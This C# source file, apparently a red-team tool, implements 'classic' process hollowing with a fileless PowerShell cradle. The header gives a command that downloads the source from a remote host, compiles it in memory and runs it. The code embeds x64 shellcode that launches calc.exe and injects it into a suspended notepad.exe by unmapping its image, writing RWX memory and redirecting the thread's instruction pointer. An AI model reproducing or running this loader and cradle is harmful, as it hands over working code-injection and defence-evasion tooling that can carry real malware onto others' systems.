/*
 * =========================================================================================
 *  CLASSIC PROCESS HOLLOWING (PowerShell In-Memory)
 * =========================================================================================
 * Target Environment: C# 5.0 (.NET Framework) / PowerShell 5.1 / 64-bit Windows
 
 * * * * DESCRIPTION:
 * This script implements the classic "RunPE" (Process Hollowing) technique. It is 
 * designed to be executed completely filelessly from memory using a PowerShell cradle 
 * and the `Add-Type` cmdlet. It spawns a legitimate process in a suspended state, 
 * forcefully unmaps (hollows out) its original memory, allocates new memory for 
 * a malicious payload, overwrites the thread context to point to the new payload, 
 * and resumes execution.
 
 * * * * EXECUTION METHOD (Fileless):
 * powershell.exe -NoProfile -Command "$src = (Invoke-RestMethod 'http://<IP>/hollow.cs') -replace '^ï»¿',''; Add-Type -TypeDefinition $src; [Hollowing.Program]::Run('C:\Windows\System32\notepad.exe')"
 
 * * * * API ARCHITECTURE BREAKDOWN:
 * - CreateProcess: Spawns the target container (e.g., notepad.exe) in a suspended state (CREATE_SUSPENDED - 0x4).
 * - NtUnmapViewOfSection: An NTAPI call used to aggressively carve out the original executable image from the process memory.
 * - VirtualAllocEx: Allocates new PAGE_EXECUTE_READWRITE (0x40) memory inside the hollowed process.
 * - WriteProcessMemory: Injects the embedded shellcode array into the newly allocated memory space.
 * - GetThreadContext / SetThreadContext: Modifies the CPU registers of the suspended thread. Specifically, it changes the Instruction Pointer (RIP on x64) to point to the injected shellcode.
 * - ResumeThread: Wakes the thread, causing the OS to execute the payload instead of the original program.
 
 * * * * RED/BLUE TEAM CONTEXT:
 * While highly effective against legacy Antivirus, this is a "noisy" baseline technique. 
 * Modern EDRs heavily monitor `NtUnmapViewOfSection` and `SetThreadContext` as 
 * primary Indicators of Compromise (IOCs) for process injection.
 * =========================================================================================
 */

// powershell.exe -NoProfile -Command "$src = (Invoke-RestMethod 'http://127.0.0.1:8000/hollow.cs') -replace '^ï»¿',''; Add-Type -TypeDefinition $src; [Hollowing.Program]::Run('C:\Windows\System32\notepad.exe')"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Hollowing
{
    public class Program
    {
        // --- 🟢 PAYLOAD SECTION 🟢 ---
        // This is a benign x64 shellcode that executes calc.exe.
        public static byte[] payload = new byte[] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,
            0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,
            0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
            0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
            0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,
            0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
            0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00
        };

        // --- Windows API Signatures ---
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO { public uint cb; public string lpReserved, lpDesktop, lpTitle; public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public ushort wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            public byte[] Header;
        }

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpAppName, string lpCmdLine, IntPtr lpProcAttr, IntPtr lpThreadAttr, bool bInherit, uint dwFlags, IntPtr lpEnv, string lpDir, [In] ref STARTUPINFO lpSI, out PROCESS_INFORMATION lpPI);

        [DllImport("ntdll.dll")]
        public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, uint size, out IntPtr written);

        [DllImport("kernel32.dll")]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        // --- Execution Logic ---
        public static void Run(string targetPath)
        {
            Console.WriteLine("[*] Starting Process Hollowing with embedded payload...");

            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // 1. Create suspended process
            if (!CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("[-] Failed to create target process.");
                return;
            }

            // 2. Hollow out (Assuming x64 ImageBase)
            IntPtr baseAddr = (IntPtr)0x400000;
            NtUnmapViewOfSection(pi.hProcess, baseAddr);

            // 3. Allocate and Write the EMBEDDED payload
            IntPtr allocated = VirtualAllocEx(pi.hProcess, baseAddr, (uint)payload.Length, 0x3000, 0x40);

            // 🟢 FIX: Declared a proper IntPtr variable instead of using the C# 7.0 discard '_'
            IntPtr bytesWritten;
            if (!WriteProcessMemory(pi.hProcess, allocated, payload, (uint)payload.Length, out bytesWritten))
            {
                Console.WriteLine("[-] Failed to write payload into process memory.");
                return;
            }

            // 4. Update Context & Resume
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = 0x100001; // CONTEXT_CONTROL

            if (GetThreadContext(pi.hThread, ref ctx))
            {
                ctx.Rip = (ulong)allocated;
                SetThreadContext(pi.hThread, ref ctx);
                ResumeThread(pi.hThread);
                Console.WriteLine("[+] Resumed. Payload should now be running inside the target process.");
            }
            else
            {
                Console.WriteLine("[-] Failed to get thread context.");
            }
        }
    }
}
